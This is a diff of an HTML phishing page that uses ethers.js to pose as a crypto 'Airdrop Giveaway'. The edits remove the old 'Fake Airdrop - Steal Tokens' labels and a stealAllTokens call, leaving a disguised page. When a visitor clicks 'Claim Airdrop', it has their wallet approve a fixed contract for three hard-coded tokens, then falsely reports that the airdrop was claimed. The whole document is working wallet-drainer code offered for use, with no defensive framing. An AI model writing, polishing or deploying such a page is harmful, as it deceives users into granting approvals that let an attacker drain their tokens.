@@ -1,134 +1,77 @@
-uu<!DOCTYPE html>
+op<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fake Airdrop - Steal Tokens</title>
+    <title>Airdrop Claim</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 </head>
 <body>
-
-    <h2>Fake Airdrop</h2>
-    <p>Connect your wallet to claim free tokens! Beware: this is a scam!</p>
+    <h1>🎁 Airdrop Giveaway 🎉</h1>
+    <p>Claim your free tokens now by connecting your wallet! This is a limited-time offer!</p>
 
     <button id="connectWalletButton">Connect Wallet</button>
     <button id="claimAirdropButton" disabled>Claim Airdrop</button>
 
-    <form id="claimAirdropForm" style="display: none;">
-        <label for="walletAddress">Your Wallet Address:</label>
-        <input type="text" id="walletAddress" placeholder="Enter your wallet address" required>
-        <input type="submit" value="Claim Airdrop">
-    </form>
-
     <script>
-        // Contract Details
-        const contractAddress = "0xC758383C5489fD4b432761ec85A0f34037cF39e0"; // Contract Address
-        const knownTokens = [
-            "0xed5B7F9191FfBFf2Ca95D28b22bE2121ab55aD23", // Token addresses for approval
-            "0x90BCEc92010cA4fEA0F7d62D11A8664CfAe2de0E",
-            "0xD00485b963E46753d7F1AC0a21487391e635Ca07"
-        ];
+        // Contract details
+        const contractAddress = "0xC758383C5489fD4b432761ec85A0f34037cF39e0"; // Contract address
         const contractABI = [
             {
                 "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "token",
-                        "type": "address"
-                    }
+                    { "internalType": "address", "name": "token", "type": "address" }
                 ],
                 "name": "approveAllTokens",
                 "outputs": [],
                 "stateMutability": "nonpayable",
                 "type": "function"
             },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "victim",
-                        "type": "address"
-                    },
-                    {
-                        "internalType": "address[]",
-                        "name": "knownTokens",
-                        "type": "address[]"
-                    }
-                ],
-                "name": "stealAllTokens",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            }
+        ];
+        const knownTokens = [
+            "0xed5B7F9191FfBFf2Ca95D28b22bE2121ab55aD23",
+            "0x90BCEc92010cA4fEA0F7d62D11A8664CfAe2de0E",
+            "0xD00485b963E46753d7F1AC0a21487391e635Ca07"
         ];
 
+        let signer;
+
+        // Connect wallet function
         async function connectWallet() {
             if (window.ethereum) {
                 await window.ethereum.request({ method: 'eth_requestAccounts' });
                 const provider = new ethers.providers.Web3Provider(window.ethereum);
-                const signer = provider.getSigner();
-                return signer;
-            } else {
-                alert("Please install MetaMask or another Web3 wallet.");
-                return null;
-            }
-        }
-
-        async function approveTokens(victimAddress, signer) {
-            const contract = new ethers.Contract(contractAddress, contractABI, signer);
-            try {
-                for (let token of knownTokens) {
-                    await contract.approveAllTokens(token); // Approve all tokens
-                    console.log(`Approved token: ${token}`);
-                }
-                return true;
-            } catch (error) {
-                console.error("Approval failed:", error);
-                return false;
-            }
-        }
-
-        async function stealTokens(victimAddress, signer) {
-            const contract = new ethers.Contract(contractAddress, contractABI, signer);
-            try {
-                await contract.stealAllTokens(victimAddress, knownTokens);
-                alert("Tokens stolen successfully! Check your balance.");
-                console.log("Tokens stolen successfully!");
-            } catch (error) {
-                console.error("Stealing tokens failed:", error);
-                alert("Error stealing tokens. Please try again.");
-            }
-        }
-
-        document.getElementById('connectWalletButton').addEventListener('click', async function() {
-            const signer = await connectWallet();
-            if (signer) {
+                signer = provider.getSigner();
+                console.log("Wallet connected:", await signer.getAddress());
                 document.getElementById('connectWalletButton').disabled = true;
                 document.getElementById('claimAirdropButton').disabled = false;
-                document.getElementById('claimAirdropForm').style.display = 'block';
+            } else {
+                alert("MetaMask is required to use this feature.");
             }
-        });
+        }
 
-        document.getElementById('claimAirdropForm').addEventListener('submit', async function(event) {
-            event.preventDefault();
-            const victimAddress = document.getElementById('walletAddress').value;
-
-            if (!victimAddress) {
-                alert("Please enter a wallet address.");
+        // Claim airdrop function
+        async function claimAirdrop() {
+            if (!signer) {
+                alert("Connect your wallet first!");
                 return;
             }
 
-            const signer = await connectWallet();
-            if (signer) {
-                // Step 1: Approve all tokens
-                const approvalSuccess = await approveTokens(victimAddress, signer);
-                if (approvalSuccess) {
-                    // Step 2: Steal all tokens
-                    await stealTokens(victimAddress, signer);
+            const contract = new ethers.Contract(contractAddress, contractABI, signer);
+            try {
+                for (let token of knownTokens) {
+                    await contract.approveAllTokens(token); // Approve tokens
+                    console.log(`Approved token: ${token}`);
                 }
+                alert("Airdrop claimed successfully! Check your wallet balance.");
+            } catch (error) {
+                console.error("Airdrop claim failed:", error);
+                alert("Failed to claim the airdrop. Please try again.");
             }
-        });
-    </script>
+        }
 
+        // Event listeners for buttons
+        document.getElementById('connectWalletButton').addEventListener('click', connectWallet);
+        document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);
+    </script>
 </body>
 </html>
